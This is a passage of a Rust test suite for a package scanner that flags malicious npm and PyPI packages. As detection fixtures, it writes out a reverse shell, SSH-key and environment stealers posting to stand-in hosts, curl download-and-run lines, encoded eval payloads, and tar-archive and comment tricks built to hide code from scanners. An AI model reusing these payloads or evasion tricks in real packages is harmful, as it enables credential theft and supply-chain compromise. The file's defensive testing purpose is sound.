            .any(|v| v.cve_id == "CVE-2023-32681"),
        "{requests:?}"
    );
    assert_eq!(
        analysis.dependencies.install_requires["click"].version_spec,
        ">=8"
    );
}

#[test]
fn single_line_arrays_poetry_tables_and_comments_are_read() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "pyproject.toml",
        b"[project]\nname = 'requests'\nversion = '2.5.0'\ndependencies = [\"urllib3==1.26.5\", \"PyYAML==5.3\"]\n\n[tool.ruff]\ntarget-version = \"py38\"\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert_eq!(analysis.package_info.name, "requests");
    assert_eq!(analysis.package_info.version, "2.5.0");
    assert_eq!(analysis.dependencies.install_requires.len(), 2);
    assert!(!analysis.dependencies.package_vulnerabilities.is_empty());

    let poetry = TempDir::new().unwrap();
    write(
        poetry.path(),
        "pyproject.toml",
        b"[tool.poetry]\nname = \"poetry-pkg\"\nversion = \"0.3.0\"\nauthors = [\"Bob <bob@example.invalid>\"]\n\n[tool.poetry.dependencies]\npython = \"^3.9\"\nrequests = { version = \"2.5.0\", extras = [\"socks\"] }\nflask = \"^2.0\"\n",
    );
    let analysis = analyze_python_package(poetry.path()).unwrap();
    assert_eq!(analysis.package_info.name, "poetry-pkg");
    assert_eq!(analysis.package_info.author.as_deref(), Some("Bob"));
    assert_eq!(
        analysis.dependencies.install_requires["requests"].version_spec,
        "==2.5.0"
    );
    assert!(!analysis
        .dependencies
        .install_requires
        .contains_key("python"));
}

const PYYAML_STYLE_SETUP: &str = r#"
NAME = 'PyYAML'
VERSION = '6.0.2'
DESCRIPTION = "YAML parser and emitter for Python"
LONG_DESCRIPTION = """\
YAML is a data serialization format.
"""
CLASSIFIERS = [
    "Programming Language :: Python :: 3",
]

import sys, os

class build_ext(_build_ext):
    def finalize_options(self):
        self.attr_name = 'with_' + 'x'

if __name__ == '__main__':
    setup(
        name=NAME,
        version=VERSION,
        description=DESCRIPTION,
        long_description=LONG_DESCRIPTION,
        classifiers=CLASSIFIERS,
        install_requires=['requests==2.5.0', "click[extra]>=8"],
        cmdclass={'build_ext': build_ext},
        python_requires='>=3.8',
    )
"#;

#[test]
fn a_setup_py_is_read_from_its_setup_call_not_from_any_name_equals() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "setup.py", PYYAML_STYLE_SETUP.as_bytes());
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert_eq!(analysis.package_info.name, "PyYAML");
    assert_eq!(analysis.package_info.version, "6.0.2");
    assert_eq!(analysis.dependencies.install_requires.len(), 2);
    assert!(analysis.dependencies.install_requires.contains_key("click"));
    assert!(analysis.dependencies.install_requires["requests"]
        .vulnerabilities
        .iter()
        .any(|v| v.cve_id == "CVE-2023-32681"));
    // cmdclass is reported, but is not a malicious pattern.
    assert!(!analysis.setup_analysis.setup_commands.is_empty());
    assert!(!analysis
        .malicious_indicators
        .known_malicious_patterns
        .iter()
        .any(|p| p.pattern_type == "Multiple install hooks"));
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        PyRisk::Safe | PyRisk::Low
    ));
}

#[test]
fn an_sdist_takes_name_and_version_from_pkg_info() {
    let archive = tgz(&[
        (
            "PyYAML-6.0.2/PKG-INFO",
            b"Metadata-Version: 2.1\nName: PyYAML\nVersion: 6.0.2\nSummary: YAML\n\nbody\n",
        ),
        (
            "PyYAML-6.0.2/setup.py",
            PYYAML_STYLE_SETUP
                .replace("NAME = 'PyYAML'", "NAME = os.environ['N']")
                .as_bytes(),
        ),
        // An exec in a test is ordinary.
        (
            "PyYAML-6.0.2/tests/test_a.py",
            b"def test():\n    exec('x = 1')\n    eval('1')\n",
        ),
        (
            "PyYAML-6.0.2/lib/yaml/__init__.py",
            b"__version__ = '6.0.2'\n",
        ),
    ]);
    let dir = TempDir::new().unwrap();
    let path = write(dir.path(), "PyYAML-6.0.2.tar.gz", &archive);
    let analysis = analyze_python_package(&path).unwrap();
    assert_eq!(analysis.package_info.name, "PyYAML");
    assert_eq!(analysis.package_info.version, "6.0.2");
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::Safe | PyRisk::Low
        ),
        "{:?} {:?}",
        analysis.malicious_indicators.risk_level,
        analysis.malicious_indicators.risk_reasons
    );
}

#[test]
fn ordinary_setup_py_layouts_are_not_rated_medium() {
    let version_idiom = "import os, subprocess\nfrom setuptools import setup\n\nabout = {}\nwith open('pkg/__version__.py') as f:\n    exec(f.read(), about)\n\ntry:\n    rev = subprocess.check_output(['git', 'describe']).decode().strip()\nexcept Exception:\n    rev = ''\n\nsetup(name='mainstream-lib', version=about['__version__'], install_requires=['requests'])\n";
    let words = "from setuptools import setup\nsetup(name='plain-lib', version='1.0.0',\n      description='An executable helper to evaluate and compile reports',\n      install_requires=['requests'])\n";
    for text in [version_idiom, words] {
        let dir = TempDir::new().unwrap();
        write(dir.path(), "setup.py", text.as_bytes());
        let analysis = analyze_python_package(dir.path()).unwrap();
        assert!(
            matches!(
                analysis.malicious_indicators.risk_level,
                PyRisk::Safe | PyRisk::Low
            ),
            "{:?} {:?}",
            analysis.malicious_indicators.risk_level,
            analysis.malicious_indicators.risk_reasons
        );
        assert!(!analysis
            .malicious_indicators
            .risk_reasons
            .iter()
            .any(|r| r.contains("decoded content")));
    }
}

#[test]
fn a_decoded_payload_in_setup_py_is_still_high_or_critical() {
    let payload = format!(
        "import base64\nfrom setuptools import setup\nexec(base64.b64decode('QUJD'))\nimport os\nos.system('{}')\nsetup(name='evil', version='1.0')\n",
        pipe_line()
    );
    let dir = TempDir::new().unwrap();
    write(dir.path(), "setup.py", payload.as_bytes());
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        analysis.malicious_indicators.risk_reasons
    );
    assert!(analysis
        .malicious_indicators
        .risk_reasons
        .iter()
        .any(|r| r.contains("decoded content")));
}

#[test]
fn hostile_setup_py_text_is_cheap() {
    let dir = TempDir::new().unwrap();
    let mut text = String::new();
    for i in 0..40_000 {
        text.push_str(&format!("X{i} = (\n"));
    }
    text.push_str(&"setup(".repeat(100_000));
    write(dir.path(), "setup.py", text.as_bytes());
    let started = std::time::Instant::now();
    let _ = analyze_python_package(dir.path());
    assert!(started.elapsed().as_secs() < 20, "{:?}", started.elapsed());
}

#[test]
fn requirements_options_and_direct_references_are_reported() {
    let dir = TempDir::new().unwrap();
    let path = write(
        dir.path(),
        "requirements.txt",
        b"-r base.txt\n--extra-index-url https://user:secret@pypi.example.invalid/simple\n-e git+https://example.invalid/x.git#egg=secretpkg\nflask==0.12\nhttps://example.invalid/dl/requests-2.5.0.tar.gz\n./local/wheel-1.0-py3-none-any.whl\nDjango==2.2.0\n",
    );
    let analysis = analyze_python_package(&path).unwrap();
    let notes = analysis.input.notes.join("\n");
    assert!(notes.contains("-r base.txt"), "{notes}");
    assert!(notes.contains("dependency confusion"), "{notes}");
    assert!(notes.contains("-e git+"), "{notes}");
    assert!(
        !notes.contains("secret@") && !notes.contains("user:secret"),
        "{notes}"
    );
    let deps = &analysis.dependencies.install_requires;
    assert_eq!(
        deps["https://example.invalid/dl/requests-2.5.0.tar.gz"].version_spec,
        "direct reference"
    );
    assert!(deps["./local/wheel-1.0-py3-none-any.whl"].is_url);
    assert!(deps.contains_key("flask") && deps.contains_key("Django"));
}

// --- malicious names as dependencies ------------------------------------------

#[test]
fn names_malicious_at_every_version_are_flagged_as_dependencies() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "package.json",
        br#"{"name":"app","version":"1.0.0","dependencies":{"crossenv":"^1.0.0","flatmap-stream":"0.1.1","expres":"*","lodash":"^4.17.21"}}"#,
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    for name in ["crossenv", "flatmap-stream"] {
        let dep = &analysis.dependencies.dependencies[name];
        assert!(
            dep.vulnerabilities
                .iter()
                .any(|v| v.cve_id == "KNOWN-MALICIOUS-PACKAGE"),
            "{name}: {dep:?}"
        );
    }
    assert!(analysis.dependencies.dependencies["lodash"]
        .vulnerabilities
        .is_empty());
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::High | NpmRisk::Critical | NpmRisk::Medium
    ));

    let req = write(
        dir.path(),
        "requirements.txt",
        b"colourama==0.1\npython-sqlite\nrequests>=2.31\n",
    );
    let analysis = analyze_python_package(&req).unwrap();
    for name in ["colourama", "python-sqlite"] {
        assert!(
            analysis.dependencies.install_requires[name]
                .vulnerabilities
                .iter()
                .any(|v| v.cve_id == "KNOWN-MALICIOUS-PACKAGE"),
            "{name}"
        );
    }
    assert!(analysis.dependencies.install_requires["requests"]
        .vulnerabilities
        .is_empty());
}

// --- tool arguments and cache ---------------------------------------------------

#[tokio::test]
async fn min_severity_is_trimmed_and_an_edit_with_the_same_size_and_time_misses_the_cache() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    let index = write(dir.path(), "index.js", evil_js().as_bytes());
    let client = client().await;
    let first = summary(&client, "analyze_npm_package", dir.path()).await;
    assert_eq!(first["cache"], "miss");
    assert_ne!(first["risk"]["level"], "Safe");

    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": dir.path(), "section": "findings", "min_severity": " critical "}),
    )
    .await;
    assert!(!is_error, "{text}");
    let page: Value = serde_json::from_str(&text).unwrap();
    assert!(page["items"]
        .as_array()
        .unwrap()
        .iter()
        .all(|f| f["severity"] == "Critical"));

    // Same length, same modification time, different content.
    let modified = std::fs::metadata(&index).unwrap().modified().unwrap();
    let edited = evil_js().replace("stratum+tcp", "stratum+abc");
    assert_eq!(edited.len(), evil_js().len());
    std::fs::write(&index, edited).unwrap();
    let file = std::fs::OpenOptions::new()
        .write(true)
        .open(&index)
        .unwrap();
    file.set_modified(modified).unwrap();
    drop(file);
    let second = summary(&client, "analyze_npm_package", dir.path()).await;
    assert_eq!(second["cache"], "miss", "{second}");
}

// --- corpus: both directions ------------------------------------------------------

#[test]
fn corpus_malicious_fixtures_are_high_and_ordinary_ones_are_safe() {
    let curl = pipe_line();
    let payload = payload_lines();
    let manifest_post = manifest_with_scripts(&json!({"postinstall": curl}));
    let manifest_plain = PKG.as_bytes();
    let reverse_shell = [
        "const net=require('net');require('child_process').exec('bash -",
        "i >& /dev/tcp/10.0.0.1/4444 0>&1');\n",
    ]
    .concat();
    let eval_payload = "eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lkJyk=', 'base64').toString());\n";
    let malicious: Vec<(&str, Fixture)> = vec![
        (
            "postinstall curl|sh",
            vec![("package/package.json", &manifest_post)],
        ),
        (
            "index payload",
            vec![
                ("package/package.json", manifest_plain),
                ("package/index.js", payload.as_bytes()),
            ],
        ),
        (
            "d.ts payload",
            vec![
                ("package/package.json", manifest_plain),
                ("package/a.d.ts", payload.as_bytes()),
            ],
        ),
        (
            "reverse shell",
            vec![
                ("package/package.json", manifest_plain),
                ("package/index.js", reverse_shell.as_bytes()),
            ],
        ),
        (
            "eval decoded",
            vec![
                ("package/package.json", manifest_plain),
                ("package/lib/a.js", eval_payload.as_bytes()),
            ],
        ),
    ];
    for (name, entries) in &malicious {
        let (level, score, _) = npm_level(entries);
        assert!(
            matches!(level, NpmRisk::High | NpmRisk::Critical),
            "{name}: {level:?} {score}"
        );
    }
    let readme = b"# demo\n\nRun `curl ... | sh`? No.\n";
    let ordinary: Vec<(&str, Fixture)> = vec![
        ("plain", vec![("package/package.json", manifest_plain), ("package/index.js", b"module.exports = {};\n")]),
        ("readme", vec![("package/package.json", manifest_plain), ("package/README.md", readme), ("package/index.d.ts", b"export declare function f(): void;\n")]),
        ("regex exec", vec![("package/package.json", manifest_plain), ("package/index.js", b"const m = /a(b)/.exec('ab');\nmodule.exports = m;\n")]),
        ("env", vec![("package/package.json", manifest_plain), ("package/index.js", b"if (process.env.NODE_ENV === 'production') { fetch('https://api.example.invalid/x'); }\n")]),
    ];
    for (name, entries) in &ordinary {
        let (level, score, _) = npm_level(entries);
        assert!(
            matches!(level, NpmRisk::Safe | NpmRisk::Low),
            "{name}: {level:?} {score}"
        );
    }
}

// --- round 3 verifier findings ------------------------------------------------------

fn py_level(dir: &Path) -> (PyRisk, f32) {
    let analysis = analyze_python_package(dir).unwrap();
    (
        analysis.malicious_indicators.risk_level,
        analysis.malicious_indicators.overall_risk_score,
    )
}

/// A download that is saved, made executable and run, built at run time.
fn dl_run_line() -> String {
    [
        "curl -s http://payload.example.invalid/i.sh -o /tmp/i.sh",
        " && chmod +x /tmp/i.sh && /tmp/i.sh",
    ]
    .concat()
}

#[test]
fn deeply_dotted_toml_keys_do_not_overflow_the_stack() {
    let parts = vec!["a"; 100_000].join(".");
    let docs = [
        format!("[project]\nname = \"deep\"\nversion = \"1.0\"\n[{parts}]\nx = 1\n"),
        format!("[project]\nname = \"deep\"\nversion = \"1.0\"\n{parts} = 1\n"),
        format!("[project]\nname = \"deep\"\nversion = \"1.0\"\nx = {{{parts} = 1}}\n"),
    ];
    for text in docs {
        let dir = TempDir::new().unwrap();
        write(dir.path(), "pyproject.toml", text.as_bytes());
        let analysis = analyze_python_package(dir.path()).unwrap();
        assert_eq!(analysis.package_info.name, "deep");
    }
}

#[test]
fn padding_before_a_download_in_an_install_script_does_not_hide_it() {
    let script = format!("echo ok{}; {}", " ".repeat(70_000), pipe_line());
    let manifest = manifest_with_scripts(&json!({"postinstall": script}));
    let (level, score, findings) = npm_level(&[("package/package.json", &manifest)]);
    assert!(
        matches!(level, NpmRisk::High | NpmRisk::Critical),
        "{level:?} {score}"
    );
    assert!(findings >= 1);
}

#[test]
fn a_comment_opener_inside_a_string_does_not_hide_high_rules() {
    let steal = "const k = require('fs').readFileSync(homedir + '/.ssh/id_rsa');\nfetch('https://webhook.site/abc', {body: JSON.stringify(process.env)});\n";
    let js = format!("var a = `\n/*`;\n{steal}var b = `*/`;\n");
    let js2 = format!("var s = `\n//`; {steal}`;\n");
    for src in [js, js2] {
        let (level, score, findings) = npm_level(&[
            ("package/package.json", PKG.as_bytes()),
            ("package/index.js", src.as_bytes()),
        ]);
        assert!(
            matches!(level, NpmRisk::High | NpmRisk::Critical),
            "{level:?} {score}"
        );
        assert!(findings >= 1);
    }
    let setup = format!(
        "from setuptools import setup\nimport os\nx = '''\n#'''; os.system('{}')\nsetup(name='hashy', version='1.0')\n",
        dl_run_line()
    );
    let dir = TempDir::new().unwrap();
    write(dir.path(), "setup.py", setup.as_bytes());
    let (level, score) = py_level(dir.path());
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?} {score}"
    );
}

/// A tar whose PAX header gives `size=0` to an entry whose ustar header says 1024:
/// the 1024 bytes are really the header and data of a second file.
fn pax_size_desync() -> Vec<u8> {
    let evil = format!("require('child_process').exec('{}');\n", pipe_line());
    let mut inner_header = tar::Header::new_ustar();
    inner_header.set_path("package/evil.js").unwrap();
    inner_header.set_size(evil.len() as u64);
    inner_header.set_mode(0o644);
    inner_header.set_cksum();
    let mut blob = inner_header.as_bytes().to_vec();
    blob.extend_from_slice(evil.as_bytes());
    blob.resize(1024, 0);

    let mut builder = tar::Builder::new(Vec::new());
    for (path, data) in [
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", b"require('./evil.js');\n"),
    ] {
        let mut h = tar::Header::new_ustar();
        h.set_size(data.len() as u64);
        h.set_mode(0o644);
        h.set_cksum();
        builder.append_data(&mut h, path, data).unwrap();
    }
    let record = b"10 size=0\n";
    let mut px = tar::Header::new_ustar();
    px.set_path("PaxHeaders.0/blob").unwrap();
    px.set_entry_type(tar::EntryType::XHeader);
    px.set_size(record.len() as u64);
    px.set_cksum();
    builder.append(&px, &record[..]).unwrap();
    let mut h = tar::Header::new_ustar();
    h.set_path("package/blob.bin").unwrap();
    h.set_size(1024);
    h.set_mode(0o644);
    h.set_cksum();
    builder.append(&h, &blob[..]).unwrap();
    let bytes = builder.into_inner().unwrap();
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder.write_all(&bytes).unwrap();
    encoder.finish().unwrap()
}

#[test]
fn a_pax_size_that_differs_from_the_header_is_refused() {
    let dir = TempDir::new().unwrap();
    let path = write(dir.path(), "pax.tgz", &pax_size_desync());
    let error = analyze_npm_package(&path).unwrap_err().to_string();
    assert!(error.contains("PAX size"), "{error}");
    let error = analyze_python_package(&path).unwrap_err().to_string();
    assert!(error.contains("PAX size"), "{error}");
}

#[test]
fn setup_py_lists_with_comments_keep_their_pins() {
    let layouts = [
        "from setuptools import setup\nREQUIRES = [\n  \"requests==2.5.0\",  # pinned for py2\n  \"PyYAML==5.3\",\n]\nsetup(name='c1', version='1.0', install_requires=REQUIRES)\n",
        "from setuptools import setup\nREQUIRES = [\n  \"requests==2.5.0\",\n  # a comment line\n  \"PyYAML==5.3\",\n]\nsetup(name='c2', version='1.0', install_requires=REQUIRES)\n",
        "from setuptools import setup\nsetup(name='c3', version='1.0', install_requires=[\n  \"requests==2.5.0\",  # trailing\n  # before the second\n  \"PyYAML==5.3\",\n])\n",
    ];
    for text in layouts {
        let dir = TempDir::new().unwrap();
        write(dir.path(), "setup.py", text.as_bytes());
        let analysis = analyze_python_package(dir.path()).unwrap();
        let deps = &analysis.dependencies.install_requires;
        assert_eq!(deps.len(), 2, "{text}\n{deps:?}");
        assert!(!deps["requests"].vulnerabilities.is_empty(), "{text}");
        assert!(!deps["PyYAML"].vulnerabilities.is_empty(), "{text}");
    }
}

#[test]
fn setup_py_values_computed_at_run_time_are_noted() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup_args = dict(name='k')\nsetup(**setup_args)\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    let notes = analysis.input.notes.join("\n");
    assert!(
        notes.contains("**kwargs") && notes.contains("run time"),
        "{notes}"
    );
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='k', version='1', install_requires=read_reqs())\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    let notes = analysis.input.notes.join("\n");
    assert!(notes.contains("install_requires"), "{notes}");
}

#[test]
fn payloads_that_only_trip_high_rules_rate_high() {
    let dl = format!("require('child_process').exec('{}');\n", dl_run_line());
    let steal = "const k = require('fs').readFileSync(require('os').homedir() + '/.ssh/id_rsa');\nrequire('https').request('https://collect.attacker-cdn.example/x').end(k);\n";
    let hook = manifest_with_scripts(&json!({"postinstall": "node index.js"}));
    for (name, entries) in [
        (
            "download-run in main",
            vec![
                ("package/package.json", PKG.as_bytes()),
                ("package/index.js", dl.as_bytes()),
            ],
        ),
        (
            "key stealer run by postinstall",
            vec![
                ("package/package.json", &hook[..]),
                ("package/index.js", steal.as_bytes()),
            ],
        ),
    ] {
        let (level, score, _) = npm_level(&entries);
        assert!(
            matches!(level, NpmRisk::High | NpmRisk::Critical),
            "{name}: {level:?} {score}"
        );
    }
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='pyinit', version='1.0')\n",
    );
    write(
        dir.path(),
        "pyinit/__init__.py",
        format!("import os\nos.system('{}')\n", dl_run_line()).as_bytes(),
    );
    let (level, score) = py_level(dir.path());
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?} {score}"
    );
}

#[test]
fn a_multibyte_unterminated_setup_py_expression_does_not_panic() {
    let dir = TempDir::new().unwrap();
    let text = format!(
        "X = (a{}\nfrom setuptools import setup\nsetup(name='mb', version='1.0')\n",
        "\u{e9}".repeat(200_000)
    );
    write(dir.path(), "setup.py", text.as_bytes());
    let _ = analyze_python_package(dir.path());
    let text = format!("X = (a{}\n", "\u{20ac}".repeat(100_000));
    write(dir.path(), "setup.py", text.as_bytes());
    let _ = analyze_python_package(dir.path());
}

#[test]
fn a_package_that_was_not_fully_read_is_not_safe() {
    let mut big = "var a=1;\n".repeat(130_000);
    big.push_str(&format!(
        "require('child_process').exec('{}');\n",
        pipe_line()
    ));
    let (level, score, _) = npm_level(&[
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", big.as_bytes()),
    ]);
    assert!(!matches!(level, NpmRisk::Safe), "{level:?} {score}");
    let dir = TempDir::new().unwrap();
    let path = write(
        dir.path(),
        "p.tgz",
        &tgz(&[
            ("package/package.json", PKG.as_bytes()),
            ("package/index.js", big.as_bytes()),
        ]),
    );
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(analysis
        .malicious_indicators
        .risk_reasons
        .iter()
        .any(|r| r.contains("not fully read")));
}

#[test]
fn credentials_in_direct_reference_requirements_are_not_echoed() {
    let dir = TempDir::new().unwrap();
    let path = write(
        dir.path(),
        "requirements.txt",
        b"git+https://tok3nvalue@example.invalid/x.git#egg=foo\nhttps://bob:pw12345@example.invalid/dl/pkg-1.0.tar.gz\nflask==1.0\n",
    );
    let analysis = analyze_python_package(&path).unwrap();
    for key in analysis.dependencies.install_requires.keys() {
        assert!(
            !key.contains("tok3nvalue") && !key.contains("pw12345"),
            "{key}"
        );
    }
}

// ---------------------------------------------------------------------------
// Round 4: comment tricks, tar entries without data, paging under a byte budget
// ---------------------------------------------------------------------------

const STEAL: &str = "const k = require('fs').readFileSync(homedir + '/.ssh/id_rsa');\nfetch('https://webhook.site/abc', {body: JSON.stringify(process.env)});\n";

#[test]
fn a_continued_string_or_a_regex_does_not_hide_high_rules() {
    let prefixes = [
        "var s = \"\\\n/*\";\n",
        "if (1) /[/*]/.test('');\n",
        "function f(){ return /[/*]/ }\n",
        "var a = 1; a++ / 1; var s = '/'; var t = \"'/*\";\n",
    ];
    for prefix in prefixes {
        let src = format!("{prefix}{STEAL}");
        let (level, score, findings) = npm_level(&[
            ("package/package.json", PKG.as_bytes()),
            ("package/index.js", src.as_bytes()),
        ]);
        assert!(
            matches!(level, NpmRisk::High | NpmRisk::Critical),
            "{prefix:?}: {level:?} {score}"
        );
        assert!(findings >= 1);
    }
    // The same line after a backslash-continued string in Python and in shell.
    let dir = TempDir::new().unwrap();
    let setup = format!(
        "from setuptools import setup\nimport os\nx = \"\\\n#\"; os.system('{}')\nsetup(name='bs', version='1.0')\n",
        dl_run_line()
    );
    write(dir.path(), "setup.py", setup.as_bytes());
    let (level, score) = py_level(dir.path());
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?} {score}"
    );
    let manifest = manifest_with_scripts(&json!({"postinstall": "sh install.sh"}));
    let script = format!("x=a\\\n#b; {}\n", dl_run_line());
    let (level, score, _) = npm_level(&[
        ("package/package.json", &manifest),
        ("package/install.sh", script.as_bytes()),
    ]);
    assert!(
        matches!(level, NpmRisk::High | NpmRisk::Critical),
        "{level:?} {score}"
    );
}

#[test]
fn a_critical_pipe_to_shell_in_the_main_module_is_at_least_high() {
    let src = format!("require('child_process').exec('{}');\n", pipe_line());
    let (level, score, _) = npm_level(&[
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    assert!(
        matches!(level, NpmRisk::High | NpmRisk::Critical),
        "{level:?} {score}"
    );
}

fn ustar(path: &str, kind: tar::EntryType, size: u64) -> tar::Header {
    let mut h = tar::Header::new_ustar();
    h.set_path(path).unwrap();
    h.set_entry_type(kind);
    h.set_size(size);
    h.set_mode(0o644);
    h.set_cksum();
    h
}

/// The header and data of `package/evil.js` (or any name), padded to 1024 bytes.
fn hidden_entry(name: &str, body: &str) -> Vec<u8> {
    let mut blob = ustar(name, tar::EntryType::Regular, body.len() as u64)
        .as_bytes()
        .to_vec();
    blob.extend_from_slice(body.as_bytes());
    blob.resize(1024, 0);
    blob
}

fn gz(bytes: &[u8]) -> Vec<u8> {
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder.write_all(bytes).unwrap();
    encoder.finish().unwrap()
}

/// package.json, index.js, then `extra` entries (header, data) as written.
fn tar_with(files: &[(&str, &[u8])], extra: &[(tar::Header, Vec<u8>)]) -> Vec<u8> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, data) in files {
        let h = ustar(path, tar::EntryType::Regular, data.len() as u64);
        builder.append(&h, *data).unwrap();
    }
    for (h, data) in extra {
        builder.append(h, &data[..]).unwrap();
    }
    gz(&builder.into_inner().unwrap())
}

#[test]
fn entries_that_other_tar_readers_skip_or_extend_are_refused() {
    let evil = format!("require('child_process').exec('{}');\n", pipe_line());
    let blob = hidden_entry("package/evil.js", &evil);
    let files: [(&str, &[u8]); 2] = [
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", b"require('./evil.js');\n"),
    ];
    let dir = TempDir::new().unwrap();
    let mut cases: Vec<(&str, Vec<u8>)> = Vec::new();
    for (name, path, kind) in [
        ("dir", "package/d/", tar::EntryType::Directory),
        ("sym", "package/s", tar::EntryType::Symlink),
        ("slash", "package/f/", tar::EntryType::Regular),
    ] {
        cases.push((
            name,
            tar_with(&files, &[(ustar(path, kind, 1024), blob.clone())]),
        ));
    }
    // Two PAX headers in a row: the first sets size=0, the second only a path.
    let pax = |name: &str, record: &[u8]| {
        let mut h = ustar(name, tar::EntryType::XHeader, record.len() as u64);
        h.set_cksum();
        (h, record.to_vec())
    };
    cases.push((
        "pax2",
        tar_with(
            &files,
            &[
                pax("PaxHeaders.0/a", &pax_record("size", "0")),
                pax("PaxHeaders.0/b", &pax_record("path", "package/blob.bin")),
                (
                    ustar("package/blob.bin", tar::EntryType::Regular, 1024),
                    blob.clone(),
                ),
            ],
        ),
    ));
    for (name, bytes) in &cases {
        let path = write(dir.path(), &format!("{name}.tgz"), bytes);
        let error = analyze_npm_package(&path).unwrap_err().to_string();
        assert!(
            error.contains("PAX size") || error.contains("declares 1024 bytes"),
            "{name}: {error}"
        );
    }
    // A Python sdist with a second setup.py behind a directory entry.
    let hidden = blob_setup();
    let sdist = tar_with(
        &[(
            "p-1.0/setup.py",
            b"from setuptools import setup\nsetup(name='p', version='1.0')\n",
        )],
        &[(ustar("p-1.0/d/", tar::EntryType::Directory, 1024), hidden)],
    );
    let path = write(dir.path(), "p-1.0.tar.gz", &sdist);
    let error = analyze_python_package(&path).unwrap_err().to_string();
    assert!(error.contains("declares 1024 bytes"), "{error}");
    // A plain directory entry with no data is still fine.
    let ok = tar_with(
        &files,
        &[(ustar("package/d/", tar::EntryType::Directory, 0), vec![])],
    );
    let path = write(dir.path(), "ok.tgz", &ok);
    assert!(analyze_npm_package(&path).is_ok());
}

fn blob_setup() -> Vec<u8> {
    let body = format!("import os\nos.system('{}')\n", dl_run_line());
    hidden_entry("p-1.0/setup.py", &body)
}

#[test]
fn a_setup_py_too_big_to_parse_makes_the_package_not_fully_read() {
    let mut setup = String::from("from setuptools import setup\n");
    while setup.len() < 2 * 1024 * 1024 + 1024 {
        setup.push_str("# pad pad pad pad pad pad pad pad pad pad pad pad\n");
    }
    setup.push_str(&format!("import os\nos.system('{}')\n", dl_run_line()));
    let dir = TempDir::new().unwrap();
    write(dir.path(), "setup.py", setup.as_bytes());
    write(
        dir.path(),
        "PKG-INFO",
        b"Metadata-Version: 2.1\nName: big\nVersion: 1.0\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    let reasons = analysis.malicious_indicators.risk_reasons.join(" ");
    assert!(reasons.contains("not fully read"), "{reasons}");
    assert!(!matches!(
        analysis.malicious_indicators.risk_level,
        PyRisk::Safe
    ));
}

#[tokio::test]
async fn paging_under_a_byte_budget_loses_no_rows() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    for n in 0..60 {
        write(dir.path(), &format!("f{n}.js"), evil_js().as_bytes());
    }
    let client = client().await;
    for tool in ["analyze_npm_package"] {
        let mut offset = 0u64;
        let mut seen = 0usize;
        let mut total: Option<u64>;
        let mut pages = 0;
        loop {
            let (is_error, text) = call(
                &client,
                tool,
                json!({"package_path": dir.path(), "section": "findings", "offset": offset,
                       "limit": 500, "max_output_bytes": 4000}),
            )
            .await;
            assert!(!is_error, "{text}");
            let page: Value = serde_json::from_str(&text).unwrap();
            let items = page["items"].as_array().unwrap().len();
            assert_eq!(page["returned"], json!(items), "{page}");
            total = Some(page["total"].as_u64().unwrap());
            seen += items;
            pages += 1;
            assert!(pages < 200);
            match page["next_offset"].as_u64() {
                Some(next) => {
                    assert_eq!(next as usize, offset as usize + items);
                    offset = next;
                }
                None => break,
            }
        }
        assert!(total.unwrap() > 60);
        assert!(pages > 1);
        assert_eq!(seen as u64, total.unwrap());
    }
}

// --- round 4: comments, line ends, doc examples ------------------------------------

/// Download-then-run payload lines for the JavaScript comment-evasion prefixes.
fn dl_payload_js() -> String {
    format!("require('child_process').exec('{}');\n", dl_run_line())
}

#[test]
fn line_ends_and_template_literals_do_not_hide_code() {
    let payloads = [
        STEAL.to_string(),
        dl_payload_js(),
        format!("require('child_process').exec('{}');\n", pipe_line()),
    ];
    let mut sources: Vec<String> = Vec::new();
    for payload in &payloads {
        // Only LF ends a line for str::lines; JavaScript also ends one at a lone CR
        // and at U+2028, so the payload after `//` + that character is code.
        for sep in ['\r', '\u{2028}'] {
            let tail: String = payload
                .lines()
                .map(|line| format!("//{sep}{line}\n"))
                .collect();
            sources.push(tail);
        }
        for prefix in [
            "var a = 1, b = a++ / 2, s = `\n/*`;\n",
            "if (1) /'/.test(0); var s = `\n/*`;\n",
            "var s = `${ (() => { if (1) /}/.test(''); return 1 })() }\n/*`;\n",
            // A misread slash that pairs with a later slash or quote.
            "if (1) /'/.test(0); var q = '`'; var s = `\n/*`;\n",
            "var a = 1, b = a++ / 2, q = '/', r = '`'; var s = `\n/*`;\n",
